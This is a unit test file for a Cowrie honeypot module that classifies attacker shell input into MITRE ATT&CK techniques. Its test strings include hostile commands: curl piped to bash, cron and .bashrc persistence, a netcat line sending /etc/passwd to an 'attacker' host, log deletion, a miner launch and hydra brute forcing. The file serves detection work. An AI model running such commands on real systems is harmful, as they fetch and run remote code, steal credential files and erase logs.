# SPDX-License-Identifier: BSD-3-Clause

"""Tests for cowrie.llm.attack_map — MITRE ATT&CK classification of
attacker command input. The contract: high recall on the common SSH
playbook, no tags for trivial navigation, deduped ids, and never raises.
"""

from __future__ import annotations

from twisted.trial import unittest

from cowrie.llm import attack_map as A


class TestClassification(unittest.TestCase):
    def assertTagged(self, command, technique_id):
        ids = A.classify_ids(command)
        self.assertIn(technique_id, ids, f"{command!r} -> {ids}")

    def test_ingress_tool_transfer(self):
        for cmd in ("wget http://evil/x", "curl -O http://evil/x",
                    "tftp -g -r x 1.2.3.4", "scp a b"):
            self.assertTagged(cmd, "T1105")

    def test_web_protocol_on_url(self):
        self.assertTagged("wget https://evil/x", "T1071.001")

    def test_system_info_discovery(self):
        for cmd in ("uname -a", "cat /proc/cpuinfo", "lscpu", "cat /etc/os-release"):
            self.assertTagged(cmd, "T1082")

    def test_user_discovery(self):
        for cmd in ("whoami", "id", "w", "groups"):
            self.assertTagged(cmd, "T1033")

    def test_account_discovery(self):
        self.assertTagged("cat /etc/passwd", "T1087")
        self.assertTagged("getent passwd", "T1087")

    def test_file_discovery(self):
        for cmd in ("ls -la /tmp", "find / -name '*.pem'", "stat /etc/passwd"):
            self.assertTagged(cmd, "T1083")

    def test_process_discovery(self):
        self.assertTagged("ps aux", "T1057")
        self.assertTagged("top -bn1", "T1057")

    def test_network_config_discovery(self):
        for cmd in ("ifconfig", "ip a", "netstat -tlnp", "ss -tlnp",
                    "cat /etc/resolv.conf"):
            self.assertTagged(cmd, "T1016")

    def test_shell_execution(self):
        self.assertTagged("curl http://x | bash", "T1059.004")
        self.assertTagged("sh -c 'id'", "T1059.004")

    def test_resource_hijacking_miner(self):
        self.assertTagged("./xmrig --donate-level 1 -o pool.minexmr.com", "T1496")
        self.assertTagged("wget http://x/cpuminer", "T1496")

    def test_persistence_cron(self):
        self.assertTagged("crontab -e", "T1053.003")
        self.assertTagged("echo '* * * * * curl x|sh' >> /etc/crontab", "T1053.003")

    def test_persistence_authorized_keys(self):
        self.assertTagged("echo KEY >> ~/.ssh/authorized_keys", "T1098.004")

    def test_persistence_shell_config(self):
        self.assertTagged("echo 'curl x|sh' >> ~/.bashrc", "T1546.004")

    def test_create_account(self):
        self.assertTagged("useradd -m hacker", "T1136")

    def test_log_clearing(self):
        self.assertTagged("rm -rf /var/log/*", "T1070.002")
        self.assertTagged("history -c", "T1070.003")

    def test_permissions_mod(self):
        self.assertTagged("chmod +x /tmp/x", "T1222.002")

    def test_deobfuscation(self):
        self.assertTagged("base64 -d payload | sh", "T1140")

    def test_valid_accounts_su_sudo(self):
        self.assertTagged("su -", "T1078")
        self.assertTagged("sudo -i", "T1548.003")

    def test_lateral_ssh(self):
        self.assertTagged("ssh root@10.0.0.5", "T1021.004")

    def test_exfil_netcat(self):
        self.assertTagged("nc attacker 4444 < /etc/passwd", "T1048")

    def test_brute_force_tool(self):
        self.assertTagged("hydra -l root -P pass.txt ssh://x", "T1110")


class TestNoise(unittest.TestCase):
    def test_navigation_untagged(self):
        for cmd in ("cd /tmp", "pwd", "clear", "exit", "echo hello", "ls"):
            # ls alone is file discovery; the rest are noise.
            if cmd == "ls":
                continue
            self.assertEqual(A.classify_ids(cmd), [], cmd)

    def test_empty_and_blank(self):
        self.assertEqual(A.classify("") , [])
        self.assertEqual(A.classify("   "), [])

    def test_chained_after_cd_still_classifies(self):
        ids = A.classify_ids("cd /tmp && wget http://evil/x")
        self.assertIn("T1105", ids)


class TestRobustness(unittest.TestCase):
    def test_dedup(self):
        # netstat matches both config + connections discovery, but each id once.
        ids = A.classify_ids("netstat -tlnp")
        self.assertEqual(len(ids), len(set(ids)))

    def test_never_raises(self):
        for junk in (None, "\x00\xff", "a" * 10000, "$(`;|&"):
            try:
                A.classify(junk if junk is not None else "")
            except Exception as e:  # pragma: no cover
                self.fail(f"classify raised on {junk!r}: {e}")

    def test_technique_has_tactic(self):
        for tech in A.classify("wget http://x | bash"):
            self.assertTrue(tech.tactic)
            self.assertTrue(tech.id.startswith("T"))
